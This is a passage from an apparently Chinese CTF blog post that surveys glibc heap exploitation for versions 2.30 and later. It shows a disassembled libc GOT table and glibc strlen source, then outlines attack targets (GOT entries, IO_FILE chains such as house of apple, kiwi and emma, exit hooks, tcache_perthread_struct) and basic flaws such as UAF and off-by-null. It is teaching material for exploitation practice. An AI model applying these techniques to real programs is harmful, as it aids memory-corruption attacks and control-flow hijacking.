class=\"number\">00000000001</span>ED018 off_1ED018      dq offset __strnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED018                                         ; DATA XREF: j___strnlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED018                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020 off_1ED020      dq offset __rawmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED028 off_1ED028      dq offset __GI___libc_realloc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED028                                         ; DATA XREF: _realloc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030 off_1ED030      dq offset __strncasecmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED038 off_1ED038      dq offset _dl_exception_create</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED038                                         ; DATA XREF: __dl_exception_create↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040 off_1ED040      dq offset __mempcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048 off_1ED048      dq offset __wmemset_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048                                         ; DATA XREF: j___wmemset_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED058                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED060                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068 off_1ED068      dq offset __libc_memmove_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070 off_1ED070      dq offset __wmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078 off_1ED078      dq offset __stpcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080 off_1ED080      dq offset __wmemcmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED088 off_1ED088      dq offset _dl_find_dso_for_object</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED090                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED098                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0 off_1ED0B0      dq offset __wcschr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0 off_1ED0C0      dq offset __memrchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D0 off_1ED0D0      dq offset __tls_get_addr</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D0                                         ; DATA XREF: ___tls_get_addr↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8 off_1ED0D8      dq offset __wmemset_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F0 off_1ED0F0      dq offset _dl_fatal_printf</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100 off_1ED100      dq offset __wcscpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED108                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110 off_1ED110      dq offset __strcasecmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED118                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120 off_1ED120      dq offset __wmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128 off_1ED128      dq offset __stpncpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130 off_1ED130      dq offset __wcscmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138 off_1ED138      dq offset __libc_memmove_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED140                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED148                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150 off_1ED150      dq offset __wcschr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158 off_1ED158      dq offset __new_memcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED160 off_1ED160      dq offset _dl_rtld_di_serinfo</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED168 off_1ED168      dq offset _dl_allocate_tls</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED168                                         ; DATA XREF: __dl_allocate_tls↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED170 off_1ED170      dq offset __tunable_get_val</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED170                                         ; DATA XREF: ___tunable_get_val↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178 off_1ED178      dq offset __wcslen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178                                         ; DATA XREF: j___wcslen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED180                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188 off_1ED188      dq offset __wcsnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED190                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED198 off_1ED198      dq offset _dl_allocate_tls_init</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0 off_1ED1B0      dq offset __strnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0 _got_plt        ends                    ; Indirect relocation</span><br></pre></td></tr></table></figure>\n<p>可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？</p>\n<p>笔者在glibc2.34的源代码中进行了查找:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// string/string.h</span></span><br><span class=\"line\"><span class=\"comment\">/* Return the length of S.  */</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">size_t</span> <span class=\"title function_\">strlen</span> <span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *__s)</span></span><br><span class=\"line\">     __THROW __attribute_pure__ __<span class=\"title function_\">nonnull</span> <span class=\"params\">((<span class=\"number\">1</span>))</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// /sysdeps/alpha/strlen.S</span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">ENTRY(<span class=\"built_in\">strlen</span>)</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PROF</span></span><br><span class=\"line\">\tldgp\tgp, <span class=\"number\">0</span>(pv)</span><br><span class=\"line\">\tlda\tAT, _mcount</span><br><span class=\"line\">\tjsr\tAT, (AT), _mcount</span><br><span class=\"line\">\t.prologue <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t.prologue <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\tldq_u   t0, <span class=\"number\">0</span>(a0)\t<span class=\"meta\"># load first quadword (a0 may be misaligned)</span></span><br><span class=\"line\">\tlda     t1, <span class=\"number\">-1</span>(zero)</span><br><span class=\"line\">\tinsqh   t1, a0, t1</span><br><span class=\"line\">\tandnot  a0, <span class=\"number\">7</span>, v0</span><br><span class=\"line\">\tor      t1, t0, t0</span><br><span class=\"line\">\tnop\t\t\t<span class=\"meta\"># dual issue the next two on ev5</span></span><br><span class=\"line\">\tcmpbge  zero, t0, t1\t# t1 &lt;- bitmask: bit i == <span class=\"number\">1</span> &lt;==&gt; i-th byte == <span class=\"number\">0</span></span><br><span class=\"line\">\tbne     t1, $found</span><br><span class=\"line\"></span><br><span class=\"line\">$loop:\tldq     t0, <span class=\"number\">8</span>(v0)</span><br><span class=\"line\">\taddq    v0, <span class=\"number\">8</span>, v0\t<span class=\"meta\"># addr += 8</span></span><br><span class=\"line\">\tcmpbge  zero, t0, t1</span><br><span class=\"line\">\tbeq     t1, $loop</span><br><span class=\"line\"></span><br><span class=\"line\">$found:\tnegq    t1, t2\t\t<span class=\"meta\"># clear all but least set bit</span></span><br><span class=\"line\">\tand     t1, t2, t1</span><br><span class=\"line\"></span><br><span class=\"line\">\tand     t1, <span class=\"number\">0xf0</span>, t2\t<span class=\"meta\"># binary search for that set bit</span></span><br><span class=\"line\">\tand\tt1, <span class=\"number\">0xcc</span>, t3</span><br><span class=\"line\">\tand\tt1, <span class=\"number\">0xaa</span>, t4</span><br><span class=\"line\">\tcmovne\tt2, <span class=\"number\">4</span>, t2</span><br><span class=\"line\">\tcmovne\tt3, <span class=\"number\">2</span>, t3</span><br><span class=\"line\">\tcmovne\tt4, <span class=\"number\">1</span>, t4</span><br><span class=\"line\">\taddq\tt2, t3, t2</span><br><span class=\"line\">\taddq\tv0, t4, v0</span><br><span class=\"line\">\taddq\tv0, t2, v0</span><br><span class=\"line\">\tnop\t\t\t<span class=\"meta\"># dual issue next two on ev4 and ev5</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsubq    v0, a0, v0</span><br><span class=\"line\">\tret</span><br><span class=\"line\"></span><br><span class=\"line\">\tEND(<span class=\"built_in\">strlen</span>)</span><br><span class=\"line\">libc_hidden_builtin_def (<span class=\"built_in\">strlen</span>)</span><br></pre></td></tr></table></figure>\n<p>发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。</p>\n<p>笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。</p>\n<p>由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。</p>\n<p>而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。</p>\n<p>同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。</p>\n<p>其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数</p>\n<h3 id=\"IO-FILE\">IO_FILE</h3>\n<p>在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流</p>\n<ul>\n<li>house of apple 2/house of cat: <code>_IO_wide_data</code>\n<ul>\n<li>主打一个简单方便</li>\n</ul>\n</li>\n<li>house of kiwi: <code>_IO_file_jumps</code>\n<ul>\n<li>缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert</li>\n</ul>\n</li>\n<li>house of emma: <code>_IO_cookie_jumps</code></li>\n</ul>\n<h3 id=\"exit\">exit()</h3>\n<ul>\n<li><strong>rtld_global</strong><br>\n基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。</li>\n<li><strong>dtor_list</strong><br>\n通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard</li>\n</ul>\n<h2 id=\"辅助攻击\">辅助攻击</h2>\n<h3 id=\"tcache-perthread-struct\">tcache_perthread_struct</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* There is one of these for each thread, which contains the</span></span><br><span class=\"line\"><span class=\"comment\">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class=\"line\"><span class=\"comment\">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class=\"line\"><span class=\"comment\">   are redundant (we could have just counted the linked list each</span></span><br><span class=\"line\"><span class=\"comment\">   time), this is for performance reasons.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">uint16_t</span> counts[TCACHE_MAX_BINS]; <span class=\"comment\">// 2*0x40 = 0x80</span></span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class=\"comment\">// 8*0x40 = 0x200</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"><span class=\"comment\">// 0x20+0x10*0x40 = 0x420  </span></span><br></pre></td></tr></table></figure>\n<p>tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。<br>\n在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。</p>\n<p>一般是作为辅助攻击的方法，可以简化攻击链。</p>\n<h4 id=\"example\">example</h4>\n<p>[[2021-DownUnder-note]]</p>\n<h3 id=\"global-max-fast\">global_max_fast</h3>\n<p>实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。</p>\n<h3 id=\"heap-info\">heap_info</h3>\n<p>直接攻击堆管理结构体，可以看看这篇帖子:<a href=\"http://phrack.org/issues/66/10.html\">house-of-mind</a><br>\n#TODO</p>\n","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":"<h1>Basic Knowledge</h1>\n<h6 id=\"bins\">bins:</h6>\n<table>\n<thead>\n<tr>\n<th>unsorted bin</th>\n<th>fast bin</th>\n<th>small bin</th>\n<th>large bin</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>NO LIMITATION</td>\n<td>0x20-0x80</td>\n<td>&lt;0x400</td>\n<td>&gt;0x400</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"libc-version\">libc version</h2>\n<p>ubuntu-libc version</p>\n<ul>\n<li>2.23=“16.04”</li>\n<li>2.24=“17.04”</li>\n<li>2.26=“17.10”</li>\n<li>2.27=“18.04”</li>\n<li>2.28=“18.10”</li>\n<li>2.29=“19.04”</li>\n<li>2.30=“19.10”</li>\n<li>2.31=“20.04”</li>\n<li>2.32=“20.10”</li>\n<li>2.33=“21.04”</li>\n<li>2.34=“22.04”</li>\n</ul>\n<h1>Overview</h1>\n<p>在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。</p>\n<p>本文主要<strong>针对glibc2.30及以上</strong>有着tcache的版本。<s>因为低于2.27版本的堆笔者根本不会</s></p>\n<p>正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。</p>\n<p>在笔者看来，一次堆利用主要分为一下几个步骤：</p>\n<ul>\n<li>漏洞的发现</li>\n<li>地址的泄露</li>\n<li>利用漏洞控制目标地址内容</li>\n<li>攻击的对象</li>\n</ul>\n<p>因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。</p>\n<p>笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， <s>才不是因为笔者懒呢</s> ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。</p>\n<h1>基本漏洞</h1>\n<p><strong>UAF</strong><br>\n在free时没有清空指针，可以重利用指针。<br>\n在没有<code>Edit</code> 的情况下，可以通过 <code>double free</code> 进行堆块重叠。</p>\n<p><strong>overflow</strong><br>\n溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用</p>\n<p><strong>off-by-one</strong>/<strong>off-by-null</strong><br>\n这里主要针对2.29-2.31版本, <a href=\"https://www.anquanke.com/post/id/236078#h3-4\">2.29-2.31版本的off-by-null</a> ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。</p>\n<p><strong>漏洞的利用</strong><br>\n上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流<br>\n考虑:</p>\n<ul>\n<li>one gadget</li>\n<li>system(“/bin/sh”)</li>\n<li>orw</li>\n</ul>\n<h1>leak</h1>\n<p>一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。</p>\n<p>一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。</p>\n<p>也可以释放入unsorted  bin 